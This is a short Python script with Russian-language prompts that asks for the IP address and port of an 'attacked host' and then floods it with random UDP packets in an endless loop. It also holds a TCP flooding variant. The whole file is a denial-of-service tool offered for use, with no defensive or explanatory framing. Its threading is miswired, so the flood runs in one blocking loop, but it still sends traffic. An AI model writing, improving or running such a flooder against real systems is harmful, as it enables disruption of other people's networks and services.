import random
import socket
import threading

ip = str(input('IP - адрес атакуемого хоста: '))
port = str(input('Номер порта атакуемого хоста: '))
choice = 'y'
times = 5000
threads = int(input('Количество потоков: '))

def run(ip,port,times):
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2(ip,port,times):
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run(ip,port,times))
		th.start()
	else:
		th = threading.Thread(target = run2(ip,port,times))
		th.start()